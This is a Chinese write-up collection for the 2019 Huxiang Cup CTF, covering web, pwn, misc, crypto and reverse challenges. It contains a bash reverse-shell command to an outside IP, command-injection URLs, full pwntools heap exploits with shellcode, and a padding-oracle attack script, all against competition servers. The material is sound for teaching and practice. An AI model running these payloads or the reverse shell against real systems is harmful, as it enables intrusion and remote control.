# 2019湖湘杯
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|中|

# 题目下载：
+ 暂无

# 网上公开WP
+ https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652852648&idx=1&sn=5cdd1b628165ebe48e7fdd0134e82dd3&chksm=bd592d658a2ea47384926de30aad6fb8a70bc70e8b14c7ddfb7d52d7f34bd0f861da319251fa&mpshare=1&scene=23&srcid=&sharer_sharetime=1573539687063&sharer_shareid=8f9cdfd70d3578e6267cbd311a63ba7a#rd
+ https://www.anquanke.com/post/id/192605
+ https://blog.csdn.net/weixin_43877387/article/details/103000522

# 本站备份WP
感谢作者：**z3r0yu、郁离歌、胖虎很忙**
## WEB
### untar

直接访问题目可以看到源码
```
<?php
    $sandbox = "sandbox/" . md5($_SERVER["REMOTE_ADDR"]);
    echo $sandbox."</br>";
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET["url"]) && !preg_match('/^(http|https):\/\/.*/', $_GET["url"]))
        die();
    $url  = str_replace("|", "", $_GET["url"]);
    $data = shell_exec("GET " . escapeshellarg($url));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    shell_exec("UNTAR ".escapeshellarg(basename($info["basename"])));
    highlight_file(__FILE__);
```

但是直接传马发现不解析，于是搜索了一下，发现 CVE-2018-12015: Archive::Tar: directory traversal

利用这个软连接可以来进行任意文件读取，具体poc如下

```
ln -s /var/www/html/index.php content 
tar cvf exp.tar content 
tar -tvvf exp.tar 
php -S 0.0.0.0:2233
```
```
http://183.129.189.62:16407/?url=http://ezlovell.zeroyu.xyz:2233/exp.tar&filename=exp.tar
```
但是这个方法没有办法读取到flag

之后参考之前hitcon的ssrfme一题，发现可以在UNTAR处进行RCE，因此有了如下的exp

```
服务器信息：202.182.115.203  2233
```


首先在服务器的z3文件中写入如下语句，方便后续执行进行反弹shell

```
bash -i >& /dev/tcp/202.182.115.203/2333 0<&1 2>&1  
```

之后启动监听和一句话服务器，一句话服务器主要用于下载z3文件

```
php -S 0.0.0.0:2233   
nc -lvp 2333
```

之后按照顺序执行下列语句即可获取反弹的shell

exp:  
```
http://183.129.189.62:16407/?url=http://202.182.115.203:2233/z3&filename=z3  
http://183.129.189.62:16407/?url=http://202.182.115.203:2233/z3&filename=bash z3|
```

![](https://ctfwp.wetolink.com/2019HuXiang/1.png)

![](https://ctfwp.wetolink.com/2019HuXiang/2.png)

### thinkphp
解法一：
直接使用Lucifer师傅的TPscan扫到漏洞，然后使用EXP直接RCE

![](https://ctfwp.wetolink.com/2019HuXiang/3.png)

## PWN
### HackNote
edit那边的strlen存在问题，如果一直输入接到下一个chunk的size地方，那就会出现new_len>old_len情况，可以下一次edit到size段，从而造成堆重叠，最后修改malloc_hook来getshell。但是长度不够，所以自写了个read后ret过去执行。
```
from pwn import *
#r=process('./HackNote')
r=remote('183.129.189.62',11104)
context(arch = 'amd64', os = 'linux')
def gd():
    gdb.attach(r)
    pause()

def add(size,content):
    r.sendlineafter('-----------------','1')
    r.sendlineafter('nput the Size:',str(size))
    r.sendafter('he Note:',content)

def free(idx):
    r.sendlineafter('-----------------','2')
    r.sendlineafter('the Index of Note:',str(idx))

def edit(idx,content):
    r.sendlineafter('-----------------','3')
    r.sendlineafter('Note',str(idx))
    r.sendafter('Input the Note:',content)

fake=0x06CBC40
free_hook=0x6CD5E8
malloc_hook=0x6CB788
sc=asm(shellcraft.sh())
sc='''
xor rdi,rdi
push 0x6cbc40
pop rsi
push 0x100
pop rbx
push 0
pop rax
syscall
push 0x6cbc40
ret
'''
sc=asm(sc)
print shellcraft.sh()
print hex(len(sc))
add(0xf8,p64(0)+p64(0xf1)+p64(fake-0x18)+p64(fake-0x10)+p64(0)*26+p64(0xf0))#0
add(0xf8,'aaaan')#1
add(0x38,'bbbbn')#2
add(0x50,'ccccn')#3
edit(0,'a'*0xf8)
edit(0,p64(0xffffffffffffffff)+p64(0xf1)+p64(fake)+p64(fake+8)+p64(0)*26+p64(0xf0)+'x41'+'x01')
free(1)
add(0xf8,'aaaan')#1
add(0x38,p64(malloc_hook-0xe-8)+'n')#4
free(2)
edit(4,p64(malloc_hook-0xe-8)+'n')
add(0x38,p64(malloc_hook-0xe-8)+'n')#2
add(0x38,'a'*6+p64(malloc_hook+8)+sc+'n')
r.sendline('1')
r.recvuntil('Input the Size:n')
r.sendline('123')
r.sendline(asm(shellcraft.sh()))
r.interactive()
```
### pwn1
静态链接啥保护都没有，洞在edit strlen函数使用，目标chunk 0x18大小，strlen就会把下一个堆头算进去，大小就变成了了0x19，edit函数有有off by one，程序数据段是可执行的，构造个overlap，fastbin attack打malloc hook就行了

```
from PwnContext import *
if __name__ == '__main__':
    context.terminal = ['tmux', 'split', '-h']
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)
    
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))

    debugg = 0
    logg = 1

    ctx.binary = './HackNote2'

    #ctx.custom_lib_dir = './glibc-all-in-one/libs/2.23-0ubuntu11_amd64/'#remote libc
    #ctx.debug_remote_libc = True

    #ctx.symbols = {'note':0x6CBC40}
    ctx.breakpoints = [0x400EB9]
    #ctx.debug()
    #ctx.start("gdb",gdbscript="set follow-fork-mode child\nc")

    if debugg:
        rs()
    else:
        ctx.remote = ('183.129.189.62', 19104)
        rs(method = 'remote')

    if logg:
        context.log_level = 'debug'

    def choice(aid):
        sla('Exit',aid)
    def add(asize,acon):
        choice(1)
        sla('Size:',asize)
        sa('Note:',acon)
    def free(aid):
        choice(2)
        sla('Note:',aid)
    def edit(aid,acon):
        choice(3)
        sla('Note:',aid)
        sa('Note:',acon)

    malloc_hook = 0x6CB788
    fake = malloc_hook-0x16
    add(0x18,'0\n')
    add(0x108,'\x00'*0xf0+p64(0x100)+'\n')
    add(0x100,'2\n')
    add(0x10,'3\n')
    free(1)
    edit(0,'0'*0x18)
    edit(0,'0'*0x18+p16(0x100))
    add(0x80,'111\n')
    add(0x30,'4\n')
    add(0x20,'5\n')

    free(1)
    free(2)
    free(4)

    add(0xa0,'0'*0x88+p64(0x41)+p64(fake)+p64(0))#1
    add(0x30,'2\n')#2
    shellcode=""
    shellcode += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
    shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
    shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05"
    add(0x38,'\x00'*0x6+p64(malloc_hook+8)+shellcode+'\n')

    #ctx.debug()
    irt()
```
### NameSystem
程序在free函数存在逻辑漏洞，当free id为18的chunk时，会多复制一个19出来，构造double free攻击got，将free改成printf进行地址泄露，最后攻击malloc hook调用one gadget
```
from PwnContext import *
if __name__ == '__main__':
    context.terminal = ['tmux', 'split', '-h']
    #-----function for quick script-----#
    s       = lambda data               :ctx.send(str(data))        #in case that data is a int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    leak    = lambda address, count=0   :ctx.leak(address, count)
    
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))

    debugg = 0
    logg = 0

    ctx.binary = './NameSystem'

    #ctx.custom_lib_dir = './glibc-all-in-one/libs/2.23-0ubuntu11_amd64/'#remote libc
    #ctx.debug_remote_libc = True

    ctx.symbols = {'note':0x6020a0}
    ctx.breakpoints = [0x400B25]
    #ctx.debug()
    #ctx.start("gdb",gdbscript="set follow-fork-mode child\nc")

    if debugg:
        rs()
    else:
        ctx.remote = ('183.129.189.62', 19205)
        rs(method = 'remote')

    if logg:
        context.log_level = 'debug'
    def choice(aid):
        sla('choice :',aid)
    def add(asize,acon):
        choice(1)
        sla('Size:',asize)
        sla('Name:',acon)
    def free(aid):
        choice(3)
        sla('delete:',aid)

    for i in range(17):
        add(0x10,'%13$p')
    for i in range(3):
        add(0x50,'AAA')
    free(18)
    free(18)
    free(17)
    free(19)
    for i in range(5):
        free(0)
    fake = 0x602000+2-8
    add(0x50,p64(fake))
    add(0x50,'111')
    add(0x50,'222')

    add(0x60,'17')
    add(0x60,'18')
    add(0x60,'19')
    free(18)
    free(19)
    free(17)
    free(17)
    plt_printf = 0x4006D0
    add(0x50,'\x00'*6+p64(0)+p64(plt_printf)[:6])

    free(0)
    libc = ELF('./libc.so.6')
    libc_base = int(r(14),16) - libc.sym['__libc_start_main'] - 240
    log.success("libc_base = %s"%hex(libc_base))

    free(0)
    free(0)
    free(0)
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    realloc_hook = libc_base + libc.sym['__realloc_hook']
    realloc = libc_base + libc.sym['realloc']
    add(0x60,p64(malloc_hook-0x23))
    add(0x60,'1')
    add(0x60,'2')
    
    one = libc_base + 0xf1147
    log.success("one = %s"%hex(one))
    add(0x60,'\x00'*0xb+p64(one)+p64(realloc+20))

    choice(1)
    sla('Size:',16)
    
    #ctx.debug()
    irt()
```

## MISC

### argument
程序接收输入后，对输入进行16进制数转换，也就是在0-9a-f之内。然后对一个全局int数组前8个成员写入常量，后8成员不变。最后比较转换后的输入和这个全局数组每个元素-1。
```
dwords = [0x00000050, 0x000000C6, 0x000000F1, 0x000000E4, 0x000000E3, 0x000000E2, 0x0000009A, 0x000000A1, 0xa7, 0xde, 0xda, 0x46, 0xab, 0x2e, 0xff, 0xdb]  
flag = '' for i in dwords:     
    flag += hex(i-1)[2:]
```

### ezre
描述：城外的人想进去，城里的人想出来  
解答：  
迷宫题，把数据提出来，分别有+7，-7，+1，-1操作，走到左下角就出flag了  

![](https://ctfwp.wetolink.com/2019HuXiang/4.png)

### icekey
载入dnspy后，找到main函数。发现程序将输入的32个字节字符串进行加密，密钥是icekey的md5值，然后内存16进制转为64字节大小的字符串和密文b比较，相同则输入的内容为flag。题目内置了解密函数，通过右键对调用加密函数的地方编辑IL指令，选择方法引用，修改enc操作的那个函数为dec操作的那个函数。然后在输入字符串后下断，断下来之后将输入字符串地址通过cheatengine修改它的内存数据为密文b，也就是让程序对密文调用解密操作，完了后再通过cheatengine查看解密结果：

![](https://ctfwp.wetolink.com/2019HuXiang/5.png)

### something in image
看到 application/vnd.oasis.opendocument.graphics 所以使用Libreoffice Writer打开这个badimages 搜索得到flag

Ps: 直接strings|grep Flag 就能搜到，hhhhh

### EzMemory
**解法一**

这个题目直接解压后对目标文件mem.raw进行二进制搜索就可以搜到flag，具体的操作如下：

PS: 一个strings命令秒掉两个misc，emmm
```
~/Downloads/hxb2019
▶ strings mem.raw| grep flag{
flag{wiND0w5_M3m0RY_F0R3n5IC5}.lnk
flag{wiND0w5_M3m0RY_F0R3n5IC5}.txt
flag{wiND0w5_M3m0RY_F0R3n5IC5}.txt
flag{wiND0w5_M3m0RY_F0R3n5IC5}.lnk
flag{wiND0w5_M3m0RY_F0R3n5IC5}.lnk
notepad  "flag{wiND0w5_M3m0RY_F0R3n5IC5}.txt"
```

**解法二**

拿到一个mem.raw，上volatility

先`volatility -f mem.raw imageinfo`获取镜像系统信息

![](https://ctfwp.wetolink.com/2019HuXiang/t01ce413012253e4102.png)

--profile=Win7SP1x64指定操作系统

`volatility -f mem.raw --profile=Win7SP1x64 pslist`列出所有进程

![](https://ctfwp.wetolink.com/2019HuXiang/t01b3b2ba5265dc2db5.jpg)

发现有一个cmd进程

`volatility -f mem.raw --profile=Win7SP1x64 cmdscan`查看命令行上的操作

![](https://ctfwp.wetolink.com/2019HuXiang/t01fe251f51bfc9fcd2.jpg)

发现flag

### miscmisc*
知识点：  
+ 明文攻击
+ 关于LSB图片隐写的解法
+ word字符隐藏显示
+ zip加密文件破解

可是今天我体会到了 （喔ca，无情），一给我里个giaogiao ，看了各位大佬的评价，今年的湖湘杯也一如既往，一边骂一边打。说下这道把我打回原形的题吧，题目分值100，这也是我见过的最难的100分题了。因为迟迟找不到wp，所以自己大概写了一份，言归正传。  
（1）拿到题目 miscmisc，打开后下载附件buguoruci.png。

![](https://ctfwp.wetolink.com/2019HuXiang/20191110184203314.png)

是一个.png后缀的图片，看到图片二话不说直接梭，拖到HXD里面，直接搜索 flag，用F3查找下一处，

![](https://ctfwp.wetolink.com/2019HuXiang/20191110204459531.png)

用winhex分析，我们会看到falg.zip字段，同时也可以看到 50 4B 03 04 的数字，没错铁子，.zip文件头是50 4B 03 04

下面是我简总结的常见的文件类型和文件头仅供参考。

![](https://ctfwp.wetolink.com/2019HuXiang/20191110204637113.jpeg)

这么多的zip格式文件，为啥不直接把源文件改成.zip格式那，直接梭，改完后成了一个.zip格式的压缩包，很惊喜，打开压缩包后，有如下两个文件，

![](https://ctfwp.wetolink.com/2019HuXiang/20191110212259372.png)

打开压缩文件 chadian.zip 。会看到一个加密的flag.zip文件和一个加密的flag.txt文本。。。这时候会想到用爆破软件Advanced Zip Password Recover 暴力破解.zip压缩包，可是暴力破解了半天，没出来密码。。

一给我里个giaogiao。不慌，我们来看buguoruci.zip下的 chayidian.jpg ，如下 emmmm，又来张图片 ，

![](https://ctfwp.wetolink.com/2019HuXiang/20191110192911497.jpg)

老规矩先放到HXD里看一下 ，同样搜索 flag ，会看到flag.txt 字段，往上扫一眼，惊喜万分又看到了 .zip文件开头 50 4B 03 04 字样，直接把jpg格式改为.zip格式。发现可以解压，得到一个 flag.txt 文件，咦，，，，，刚才解压chayidian.zip文件时，目录下也有一个flag.txt 文件，查看两个文件的CRC32 可知两个文件一样，很明显这是一个明文攻击，又已知是.zip加密，上工具 Advanced Zip Password Recover

![](https://ctfwp.wetolink.com/2019HuXiang/20191110195232402.png)

软件具体使用方法自行百度，在这里我跑出密码 `z$^58a4w`

![](https://ctfwp.wetolink.com/2019HuXiang/20191110195456655.png)

拿着密码将加密文件 flag.zip解压，得到如下几个文件 

![](https://ctfwp.wetolink.com/2019HuXiang/20191110195913733.png)

（1）打开whoami.zip文件，发现有个加密文本，需要密码，猜想flag就在里面。

![](https://ctfwp.wetolink.com/2019HuXiang/20191110204023122.png)

（2）打开world.doc文件，只有简单几个字。

![](https://ctfwp.wetolink.com/2019HuXiang/20191110200318609.png)无用，

（3）打开 world1.png图片，

![](https://ctfwp.wetolink.com/2019HuXiang/20191110200510771.png)

发现有提示： `pass in world.` 此时想到密码可能与 此图片还有world.doc文件有关。既然是图片隐写，

（1）放到HXD里面分析一下，发现没收获，再用经常使用的工具 StegSolve

打开图片然后试探各种通道，在LSB BGR条件下发现pass，所以这是LSB信息隐写。得到pass：z^ea，去解压文件 发现不行。
[LSB隐写详解](https://blog.csdn.net/qq_42391153/article/details/101457015)

![](https://ctfwp.wetolink.com/2019HuXiang/20191110203846536.png)

（2）根据提示 pass in world 猜想 world.doc 文件里不可能那么简单 可能还会有隐藏文字，百度一下，ctrl+A 全选，右击—字体—取消勾选隐藏。果不其然，发现了隐藏字符，

![](https://ctfwp.wetolink.com/2019HuXiang/20191110202655404.png)

（3）到此为止，我们从world1.png中得到 pass：z^ea 在world.doc文件中得到隐藏字符串。

（4）出题人真不要脸，最后来了一个脑筋急转弯，谁会想到最后的密码是 pass内容+world里每行字符串的最后一个字符，

就是密码 ：z^ea4zaa3azf8

（5）用密码解压加密文本，

![](https://ctfwp.wetolink.com/2019HuXiang/20191111163034316.png)

得到flag ：`flag{12sad7eaf46a84fe9q4fasf48e6q4f6as4f864q9e48f9q4fa6sf6f48}`
### misc4
azpr爆破解压密码为123456
elf运行后有flag，但是提交错误。根据题目名字猜测是elf隐写，搜了半天搜到一个hydan隐写，参考链接：https://www.cnblogs.com/pcat/p/6716502.html
但是hydan解密需要密码。猜测和压缩包密码一样是123456，得到8*&#b，然后解密aes密文，得到`bNa3vN1ImCHYlN42kC1FYA47aMalbAXIpNaMsAXBVNKApMqMnBro8`，再解一层xxencode，然后再栅栏拿到最后的flag

## CRYPTO
### give me your passport
本题提供源码，以交互的方式进行。开始交互时题目会在后台生成8-12个随机字符组成的name,然后生成随机的加密初始向量iv，之后利用未知的key进行CBC方式的AES对name加密，返回给我们iv和name的加密结果的hex编码。用户输入数据，服务器会以输入的前16字节作为新的iv对其余数据进行解密，如果解密出来的name是‘Admin’则给出flag。采用CBC的加密方式，可以想到的攻击方式有字节翻转，根据加密原理已知 `（pad(name) ^iv） =  deAES(out) ` 要使 `（pad(payload) ^newiv） = deAES(out)` 可得` newiv = pad(name) ^iv ^pad(payload)`  其中name未知，问题的关键在于求name。关键问题代码在此：
```
def check_pad(s, block_size):
    assert len(s) % block_size == 0
    assert ord(s[-1]) <= block_size
    for i in range(ord(s[-1])):
        assert s[-1-i] == s[-1]#mark
    return s[:-1-i]
```
以及主程序的一段判断：
```
try:
    print "padplain_text:" + plain_text
    plain_text = check_pad(plain_text, AES.block_size)
    print "plain_text:"+plain_text
except:
    print "padding error"
    sys.stdout.flush()
    return
if plain_text == 'Admin':
    print "Welcome admin, your flag is %s" % FLAG
    sys.stdout.flush()
    return
else:
    print "YOU. SHALL. NOT. PASS!"
    sys.stdout.flush()
    return
```
    
问题在于check_pad中要求pad的每一位都要一样，在解密不为admin的情况下也会又两种情况，一种通过check_pad返回"YOU. SHALL. NOT. PASS"，一种不通过返回"padding error",可以根据这两点的不同来逐位计算出name。具体过程： 首先计算出位数，不同位数pad的值不一样，设定name = 'q'i，i取8-12位,payload = '~'15,计算newiv,只有取到正确的i时才可以过check_pad。 之后利用类似的方法由后至前逐位求出name,最后求出newiv，获得flag。脚本如下：
```
# -*- coding: utf-8 -*-
# @Date:   2019-11-09 13:16:32
# @Last Modified time: 2019-11-09 16:16:32

from pwn import *
from Crypto.Cipher import AES


def pad(s, block_size):
    return s + (block_size - len(s) % block_size) * chr(block_size - len(s) % block_size)


if __name__ == "__main__":
    robj = remote("183.129.189.62", 19206)
    temporary = robj.recvline()[:-1]
    iv = str(temporary[-64: -32])
    cipher = str(temporary[-32:])
    temporary = robj.recvline()
    # cacl name suffix
    payload = '~'*15
    for i in range(7, 13):
        name = 'q'*i
        iwt = int(iv, 16) ^ int(pad(payload, AES.block_size).encode('hex'),
                                16) ^ int(pad(name, AES.block_size).encode('hex'), 16)
        iwt = hex(iwt)[2:] + cipher
        robj.sendline(iwt)
        temporary = robj.recvline()[:-1]
        if 'padding error' not in temporary:
            break

    length = i
    the_true_name = ''
    for i in range(length):
        for j in range(33, 128):
            name = '~' * (length - 1 - i) + chr(j) + the_true_name
            payload = '~' * (len(name)-1 - i)
            iwt = int(iv, 16) ^ int(pad(payload, AES.block_size).encode('hex'), 16) ^ int(
                pad(name, AES.block_size).encode('hex'), 16)
            iwt = hex(iwt)[2:] + cipher
            robj.sendline(iwt)
            temporary = robj.recvline()[:-1]
            if 'padding error' not in temporary:
                the_true_name = chr(j) + the_true_name
                break

    user_role = "Admin"
    iwt = int(iv, 16) ^ int(pad(user_role, AES.block_size).encode('hex'),
                            16) ^ int(pad(the_true_name, AES.block_size).encode('hex'), 16)
    iwt = hex(iwt)[2:] + cipher
    robj.sendline(iwt)
    flag = robj.recvline()[:-1]
    print 'flag:' + str(flag)
```

### rsa
题目是一个RSA加密，已知n,e,dp,c,求m,推理过程可以参考[RSA之拒绝套路(1)](https://skysec.top/2018/08/24/RSA%E4%B9%8B%E6%8B%92%E7%BB%9D%E5%A5%97%E8%B7%AF(1)/)

dp的意思为：`dp≡d mod (p−1)`

故此可以得到
```
k2∗(p−1)∗(q−1)+1=k1∗(p−1)+dp∗ek2∗(p−1)∗(q−1)+1=k1∗(p−1)+dp∗e
```
变换一下
```
(p−1)∗[k2∗(q−1)−k1]+1=dp∗e(p−1)∗[k2∗(q−1)−k1]+1=dp∗e
```
因为
```
dp<p−1dp<p−1
```
可以得到
```
e>k2∗(q−1)−k1e>k2∗(q−1)−k1
```
我们假设
```
x=k2∗(q−1)−k1x=k2∗(q−1)−k1
```
可以得到x的范围为
```
(0,e)(0,e)
```
因此有
```
x∗(p−1)+1=dp∗ex∗(p−1)+1=dp∗e
```
那么我们可以遍历
```
x∈(0,e)x∈(0,e)
```
求出p-1，求的方法也很简单，遍历65537种可能，其中肯定有一个p可以被n整除那么求出p和q，即可利用
```
ϕ(n)=(p−1)∗(q−1)d∗e≡1 mod ϕ(n)ϕ(n)=(p−1)∗(q−1)d∗e≡1 mod ϕ(n)
```
推出
```
d≡1∗e−1 mod ϕ(n)d≡1∗e−1 mod ϕ(n)
```
```
import gmpy2
import libnum
n = 22000596569856085362623019573995240143720890380678581299411213688857584612953014122879995808816872221032805734151343458921719334360194024890377075521680399678533655114261000716106870610083356478621445541840124447459943322577740268407217950081217130055057926816065068275999620502766866379465521042298370686053823448099778572878765782711260673185703889168702746195779250373642505375725925213796848495518878490786035363094086520257020021547827073768598600151928787434153003675096254792245014217044607440890694190989162318846104385311646123343795149489946251221774030484424581846841141819601874562109228016707364220840611
e = 65537
dp = 84373069210173690047629226878686144017052129353931011112880892379361035492516066159394115482289291025932915787077633999791002846189004408043685986856359812230222233165493645074459765748901898518115384084258143483508823079115319711227124403284267559950883054402576935436305927705016459382628196407373896831725
c = 14874271064669918581178066047207495551570421575260298116038863877424499500626920855863261194264169850678206604144314318171829367575688726593323863145664241189167820996601561389159819873734368810449011761054668595565217970516125181240869998009561140277444653698278073509852288720276008438965069627886972839146199102497874818473454932012374251932864118784065064885987416408142362577322906063320726241313252172382519793691513360909796645028353257317044086708114163313328952830378067342164675055195428728335222242094290731292113709866489975077052604333805889421889967835433026770417624703011718120347415460385182429795735

for i in range(1,65538):
    if (dp*e-1)%i == 0:
        if n%(((dp*e-1)/i)+1)==0:
            p=((dp*e-1)/i)+1
            q=n/(((dp*e-1)/i)+1)
            phi = (p-1)*(q-1)
            d = gmpy2.invert(e,phi)%phi
            print libnum.n2s(pow(c,d,n))
```
### DES
题目未知key,采用DES加密，已知Kn，也就是子密钥，已知mes加密的结果，要求求出mes以及key。 主要思路是这样，第一步通过DES子密钥求出密钥key，之后通过key直接进行解密求出mes,当然也可以直接用子密钥求解出mes。 通过子密钥求解key可以参考[一道有关密钥编排的DES题目](https://skysec.top/2017/12/25/%E4%B8%80%E9%81%93%E6%9C%89%E5%85%B3%E5%AF%86%E9%92%A5%E7%BC%96%E6%8E%92%E7%9A%84DES%E9%A2%98%E7%9B%AE/#%E7%94%B1%E5%AD%90%E5%AF%86%E9%92%A5%E5%8F%8D%E6%8E%A8deskey)(飘零师傅NB,一搜又是你)，一步一步求解，但是密钥生成子密钥的过程中有8位是没有用的，所以逆向推导子密钥会有8位是不确定的，遍历出来会有256个密钥，这256个密钥都可以用来加密解密，而且结果都是正确的。具体参考过程如下：
```
key1 = [1,0,1,0,0,0,0,0,1,0,0,1,0,1,1,0,0,1,0,0,0,1,1,0,0,0,1,1,1,0,1,1,0,0,0,0,0,1,1,1,1,0,0,1,1,0,0,0]
__pc2 = [
      13,16,10,23,0,4,
       2,27,14,5,20,9,
      22,18,11,3,25,7,
      15,6,26,19,12,1,
      40,51,30,36,46,54,
      29,39,50,44,32,47,
      43,48,38,55,33,52,
      45,41,49,35,28,31
   ]
C1D1 = ['*']*56
for i in range(0,len(key1)):
    C1D1[__pc2[i]] = key1[i]
print C1D1
#[00000001*11111100*110*00*000
# 011001*01*1101*0001011000*01]
# you1
C0 = '000000001*11111100*110*00*00'
D0 = '1011001*01*1101*0001011000*01'
__pc1 = [56,48,40,32,24,16,8,
         0,57,49,41,33,25,17,
         9,1,58,50,42,34,26,
         18,10,2,59,51,43,35,
         62,54,46,38,30,22,14,
         6,61,53,45,37,29,21,
         13,5,60,52,44,36,28,
         20,12,4,27,19,11,3
         ]
C0D0 = C0+D0
res = ['*']*64
deskey = ""
for i in range(0,len(__pc1)):
    res[__pc1[i]] = C0D0[i]
for i in res:
    deskey += i
print deskey

def zuoyiwei(str,num):
    my = str[num:len(str)]
    my = my+str[0:num]
    return my
def key_change_1(str):
    key1_list = [57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4]
    res = ""
    for i in key1_list:
        res+=str[i-1]
    return res

def key_change_2(str):
    key2_list = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32]
    res = ""
    for i in key2_list:
        res+=str[i-1]
    return res
def key_gen(str):
    key_list = []
    key_change_res = key_change_1(str)
    key_c = key_change_res[0:28]
    key_d = key_change_res[28:]
    for i in range(1,17):
        if (i==1) or (i==2) or (i==9) or (i==16):
            key_c = zuoyiwei(key_c,1)
            key_d = zuoyiwei(key_d,1)
        else:
            key_c = zuoyiwei(key_c,2)
            key_d = zuoyiwei(key_d,2)
        key_yiwei = key_c+key_d
        key_res = key_change_2(key_yiwei)
        key_list.append(key_res)
    return key_list
deskey = "01000abc01de111f0100100h0110010i0110111j01k00L1m0n0o010p0100001q"
print key_gen(deskey)
deskey = "0100000c0110111f0100100h0110010i0110111j0110011m0100010p0100001q"
# ['101000001001011001000110001110110000011110011000','1k1o000000d101100n010010100l011000110110be1a0110','01100100kn010d10011100000011110ae00010111110010b','1d0001101101000n01010ok0000100b011l01e0011010011','00k01110d10000110101001n01l0e1111010010b00010a01','0010111n0101000100o010d1101010110e100101a10010l0','o0d0101100000001n10k10010b101l00110100110000011a','000n1k01010010o010011001e10101a0010001001l10b110','00o111010100n00k1d0010000l00000e11111b01010101a0','000100100dn010011000110k0110ba01101001001011l000','0001100k00101n0d000o0101111010010b0l11000a001e11','0n000o0100101100k010110d00001110a1010010e0l11110','110k00odn010010010100100b00101010101la011110010e','1101o00010001110d01000n01000a0e0100010b0111l0001','11nd0000101100100010ok10110b001l1a10111e00010101','10100000101ndk10o010011010100e011001a0l000001b11']
# [101000001001011001000110001110110000011110011000], [111000000011011001010010100101100011011000100110],[011001001101011001110000001111000000101111100100],[110001101101000101010010000100001110100011010011], [001011101100001101010011011001111010010000010001],[001011110101000100001011101010110010010101001010],[001010110000000111011001001011001101001100000110],[000111010100100010011001010101000100010011100110],[000111010100100111001000010000001111100101010100],[000100100110100110001101011000011010010010111000],[000110010010110100000101111010010001110000001011],[010000010010110010101101000011100101001000111110],[110100011010010010100100000101010101100111100100],[110100001000111010100010100000001000100011110001],[111100001011001000100110110000111010111000010101],[101000001011111000100110101000011001001000001011]

print key_gen(deskey)

# deskey = "0100000"+c+"0110111"+f+"0100100"+h+"0110010"+i+"0110111"+j+"0110011"+m+"0100010"+p+"0100001"+q
def bintostr(str):
    res = ""
    for i in range(0, len(str), 8):
        res += chr(int(str[i:i+8],2))
    return res
for c in "01":
    for f in "01":
        for h in "01":
            for i in "01":
                for j in "01":
                    for m in "01":
                        for p in "01":
                            for q in "01":
                                str = "0100000" + c + "0110111" + f + "0100100" + h + "0110010" + i + "0110111" + j + "0110011" + m + "0100010" + p + "0100001" + q
                                str = bintostr(str)
                                print +str
```
求出256个密钥后用任一解密可以得到mes。然后就是让人秃头的地方，讲道理这里一般都有个啥暗示可以筛选或者看出来一个明显特定的密钥，开始我盲猜要是可见字符，然后全部都是，然后又根据其它flag盲猜是uuid,然后全部都不是。 然后比赛快结束的时候，木的办法的我只好遍历了256个flag，开始一个一个试，在经历了卡顿掉线重新登陆提交的20分钟后我试出来了，具体结果就不说了，这个key确实是一个特定的词，但是混在256个里面很难看出来。

## REVERSE
### re1
程序实现了一个迷宫输入必须为hex
dump出地图
```
8 1 e b 7 10 1
b f f 1 1 9 1
1 1 1 1 1 b 1
c c 8 e 1 8 1
8 1 1 c 9 e 1
d 8 b 1 1 1 1
1 1 9 a 9 9 63

1 up
2 down
3 left
4 right

2 4 4 1 4 4 4 2 2 2 2 3 3 1 3 3 3 2 2 4 4 2 4 4 4 4
```
输入后对输入替换出现flag

![](https://ctfwp.wetolink.com/2019HuXiang/t018c3b1323ec3b8739.png)

### re2
upx壳直接脱完后发现是: 输入转16进制-1后直接明文比较

dump出数据-1后就是答案 //转16进制函数中还初始化了些加上即可

4fc5f0e3e2e199a0a6ddd945aa2dfeda

### re3
加密和解密函数都调用了下
对输入加密后与局部变
`3ACF8D62AAA0B630C4AF43AF327CE129D46F0FEB98D9040F713BE65502A5107A`比较
直接在解密函数前把输入的加密替换成上面的就行
然后查看回显是`3561636230363233313732346338633336396261653731313136366462653835`

![](https://ctfwp.wetolink.com/2019HuXiang/t0139fd3fb1f3bfb88c.png)

转字符串就是flag
`5acb06231724c8c369bae711166dbe85`
## 创新
### 云安全
Blizzard CTF 2017 Strng 魔改题，漏洞相同，仍然是pmio 地址没有校验的问题可以造成任意读写，只是把原来的函数指针改成了timer，通过读timer中的数据泄露地址，然后修改timer指针，触发timer，拿到flag
```
include <assert.h>
include <fcntl.h>
include <inttypes.h>
